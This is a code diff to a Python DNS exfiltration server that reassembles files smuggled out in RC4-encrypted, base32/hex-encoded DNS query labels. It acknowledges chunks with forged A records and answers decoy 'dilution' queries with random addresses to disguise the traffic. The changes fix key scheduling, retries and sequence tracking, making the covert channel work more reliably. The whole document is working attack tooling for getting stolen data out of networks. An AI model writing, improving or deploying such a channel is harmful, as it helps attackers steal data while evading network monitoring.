@@ -13,6 +13,7 @@ import zipfile
 import random
 import traceback
 import tldextract
+PSL_EXTRACT = tldextract.TLDExtract(suffix_list_urls=(), cache_dir=None, include_psl_private_domains=False)  # keep in sync with feature_extraction._EXTRACT
 
 # ======================================================================================================
 # RC4 CLASS (with state maintained between calls)
@@ -27,9 +28,11 @@ class RC4:
             self.init(key)
 
     def init(self, key):
+        # Standard RC4 Key-Scheduling Algorithm (KSA) - matches client
+        j = 0
         for i in range(256):
-            self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
-            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
+            j = (j + self.state[i] + ord(key[i % len(key)])) & 0xFF
+            self.state[i], self.state[j] = self.state[j], self.state[i]
         self.x = 0
         self.y = 0
 
@@ -46,12 +49,14 @@ class RC4:
 # HELPER FUNCTIONS
 # ======================================================================================================
 
+
 def progress(count, total, status=''):
     bar_len = 60
     filled_len = int(round(bar_len * count / float(total)))
     percents = round(100.0 * count / float(total), 1)
     bar = '=' * filled_len + '-' * (bar_len - filled_len)
     sys.stdout.write('[%s] %s%s\t%s\t\r' % (bar, percents, '%', status))
+
 
 
 def fromBase32Map(msg):
@@ -79,6 +84,7 @@ def fromBase32Map(msg):
     return fromBase32(base32_string)
 
 
+
 def fromBase32(string):
     """Decode standard Base32 string."""
     mod = len(string) % 8
@@ -86,20 +92,13 @@ def fromBase32(string):
     return b32decode(string.upper() + padding)
 
 
-def fromBase64(string):
-    """Decode Base64 string (with DNS-safe character handling).
-    DNS-safe variant mapping: + -> -, / -> x
-    Reverse mapping: - -> +, x -> /
-    """
-    string = string.replace('-', '+').replace('x', '/')
-    mod = len(string) % 4
-    padding = {1: "===", 2: "==", 3: "="}.get(mod, "")
-    return b64decode(string + padding)
+
 
 
 def fromHex(string):
     """Decode hexadecimal string."""
     return bytes.fromhex(string)
+
 
 
 def color(string, color=None):
@@ -115,6 +114,7 @@ def color(string, color=None):
         elif string.strip().startswith("[?"): attr.append('33')
         elif string.strip().startswith("[*"): attr.append('34')
     return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
+
 
 
 def entropy(text):
@@ -142,12 +142,12 @@ if __name__ == '__main__':
 
     domains = []
     with open(args.domainFile, 'r') as f:
-        domains = [line.strip() for line in f if line.strip()]
+        domains = [line.strip().rstrip('.').lower() for line in f if line.strip()]
 
     print(color("[*] DNS Exfiltration Server"))
     print(color("[*] Listening on port 53"))
     print(color(f"[*] Domains: {domains}"))
-    print(color("[*] Supported encodings: base32map (0), base32 (1), base64 (2), hex (3)"))
+    print(color("[*] Supported encodings: base32map (0), base32 (1), hex (2)"))
 
     try:
         requestIndex = 0
@@ -156,6 +156,7 @@ if __name__ == '__main__':
         totalFileSize = 0
         initBuffer = ''
         init_complete = False
+        processed_seqs = set()  # Track already-processed sequence numbers for retry handling
 
         base32Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
 
@@ -167,8 +168,7 @@ if __name__ == '__main__':
         encoding_map = {
             '0': 'base32map',
             '1': 'base32',
-            '2': 'base64',
-            '3': 'hex'
+            '2': 'hex'
         }
 
         # Initialize RC4 once with pre-shared password
@@ -183,15 +183,17 @@ if __name__ == '__main__':
 
             if request.q.qtype == 1:
                 qname = str(request.q.qname)
-                extracted = tldextract.extract(qname.rstrip('.'))
+                # Case is kept in the labels (payload); only the eTLD+1 key is lowercased.
+                extracted = PSL_EXTRACT(qname.rstrip('.'))
+                registered = f"{extracted.domain}.{extracted.suffix}".lower() if extracted.domain and extracted.suffix else ""
                 subdomain = extracted.subdomain
                 labels = subdomain.split('.') if subdomain else []
 
-                if extracted.top_domain_under_registry_suffix not in domains:
-                    print(color(f'[!] Domain {extracted.top_domain_under_registry_suffix} not in allowed list, ignoring'))
+                if registered not in domains:
+                    print(color(f'[!] Domain {registered} not in allowed list, ignoring'))
                     continue
 
-                # INIT message - single label
+                # Single label: INIT (before complete) or DILUTION (after complete)
                 if len(labels) == 1:
                     if not init_complete:
                         print(color('[*] Detected INIT request'))
@@ -202,9 +204,11 @@ if __name__ == '__main__':
                         try:
                             decoded_bytes = fromBase32Map(initBuffer)
                             msg = decoded_bytes.decode('utf-8')
+                            # "<encoding>|<file size>|": only the trailing '|' marks the
+                            # init as complete; a prefix like "1|303" of "1|3030|" is not.
                             parts = msg.split('|')
-                            if len(parts) == 2:
-                                encoding_num, fileSize_str = parts
+                            if len(parts) == 3 and parts[2] == '' and parts[1].isdigit():
+                                encoding_num, fileSize_str = parts[0], parts[1]
                                 totalFileSize = int(fileSize_str)
                                 if encoding_num in encoding_map:
                                     encoding_type = encoding_map[encoding_num]
@@ -230,60 +234,88 @@ if __name__ == '__main__':
                         print(color("[*] Init not complete, waiting for more..."))
                         continue
                     
-                    # ===== INIT IS COMPLETE - PROCESS AS DATA CHUNK =====
+                    else:
+                        # Single label after init complete = DILUTION
+                        print(color("[*] Received Dilution query..."))
+                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+                        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), ttl=60))
+                        udps.sendto(reply.pack(), addr)
+                        continue
+
+                # Multi-label (2+) = DATA
+                if len(labels) >= 2:
                     if encoding_type is None:
                         print(color("[!] Error: Received data before init"))
                         continue
 
-                    rawData = labels[0]
-                    currentEntropy = entropy(rawData)
-                    entropies.append(currentEntropy)
+                    seq_number = int(labels[0])  # First label = sequence number (plaintext)
+                    rawData = '.'.join(labels[1:])  # Remaining labels = encoded data
+                    
+                    print(color(f"[*] Received DATA: seq={seq_number}, data={rawData[:20]}..."))
 
-                    # Decode based on encoding type
-                    if encoding_type == 'base32':
-                        decoded = fromBase32(rawData)
-                    elif encoding_type == 'base64':
-                        decoded = fromBase64(rawData)
-                    elif encoding_type == 'hex':
-                        decoded = fromHex(rawData)
-                    else:  # base32map
-                        base32_string = ''
-                        index = 0
-                        while index < len(rawData):
-                            word = rawData[index:index+3]
-                            if word in map_words:
-                                base32_string += base32Alphabet[map_words.index(word)]
-                            index += 3
-                        mod = len(base32_string) % 8
-                        padding = {2: "======", 4: "====", 5: "===", 7: "="}.get(mod, "")
-                        decoded = b32decode(base32_string + padding)
-
-                    # Decrypt - RC4 maintains state between calls
-                    decrypted = rc4Decryptor.binaryDecrypt(decoded)
-
-                    if len(decrypted) < 1:
-                        print(color("[!] Decrypted chunk too short"))
+                    # FIX for B3-CHK-001: Enforce label length limit (DNS max 63 chars per label)
+                    if len(rawData) > 63:
+                        print(color(f"[!] Label too long ({len(rawData)} chars), skipping"))
+                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+                        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{requestIndex % 256}"), ttl=60))
+                        udps.sendto(reply.pack(), addr)
                         continue
-
-                    # First byte is sequence number
-                    seq_number = decrypted[0]
-                    data_chunk = decrypted[1:]
-
-                    # Verify sequence number
+                    
+                    # FIX for B4-RETRY-004: Track processed sequence numbers
+                    # Accept current, previous, or any already-processed (retry)
                     expected_seq_number = requestIndex % 256
-                    if seq_number != expected_seq_number:
-                        print(color(f"[!] Out of order request: expected {expected_seq_number}, got {seq_number}"))
-                        continue
 
-                    # Append data chunk
-                    fileData.extend(data_chunk)
+                    if seq_number == expected_seq_number:
+                        # New chunk: decode, decrypt and append. Only new chunks are
+                        # decrypted: the client encrypts each chunk once and resends
+                        # the same bytes on a retry, so decrypting a duplicate (client
+                        # retry, dig or resolver retransmission) would advance the RC4
+                        # keystream past the client's and corrupt every later chunk.
+                        currentEntropy = entropy(rawData)
+                        entropies.append(currentEntropy)
+
+                        # Decode based on encoding type
+                        if encoding_type == 'base32':
+                            decoded = fromBase32(rawData)
+                        elif encoding_type == 'hex':
+                            decoded = fromHex(rawData)
+                        else:  # base32map
+                            base32_string = ''
+                            index = 0
+                            while index < len(rawData):
+                                word = rawData[index:index+3]
+                                if word in map_words:
+                                    base32_string += base32Alphabet[map_words.index(word)]
+                                index += 3
+                            mod = len(base32_string) % 8
+                            padding = {2: "======", 4: "====", 5: "===", 7: "="}.get(mod, "")
+                            decoded = b32decode(base32_string + padding)
+
+                        # Decrypt - RC4 maintains state between calls
+                        decrypted = rc4Decryptor.binaryDecrypt(decoded)
+
+                        if len(decrypted) < 1:
+                            print(color("[!] Decrypted chunk too short"))
+                            continue
+
+                        # Sequence number is from label (plaintext), decrypted data is pure payload
+                        fileData.extend(decrypted)
+                        requestIndex += 1
+                        processed_seqs.add(seq_number)
+                    elif seq_number in processed_seqs:
+                        # Retry of already-processed request - resend ACK
+                        print(color(f"[*] Retry detected: seq {seq_number} (already processed)"))
+                    elif seq_number == (expected_seq_number - 1) % 256:
+                        # Retry of immediate previous - resend ACK (should not happen with proper tracking)
+                        print(color(f"[*] Retry detected: seq {seq_number} (previous)"))
+                    else:
+                        print(color(f"[!] Out of order: expected {expected_seq_number}, got {seq_number}"))
+                        continue
 
                     # Send ACK with sequence number
                     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                     reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{seq_number}")))
                     udps.sendto(reply.pack(), addr)
-
-                    requestIndex += 1
                     progress(len(fileData), totalFileSize, "Receiving")
 
                     # All data received when we have totalFileSize bytes
@@ -325,16 +357,8 @@ if __name__ == '__main__':
                         requestIndex = 0
                         init_complete = False
                         initBuffer = ''
+                        processed_seqs = set()
                         continue
-
-                # Multi-label or other queries - treat as dilution
-                else:
-                    print()
-                    print(color("[*] Received Dilution query..."))
-                    print()
-                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-                    reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), ttl=60))
-                    udps.sendto(reply.pack(), addr)
 
     except KeyboardInterrupt:
         pass
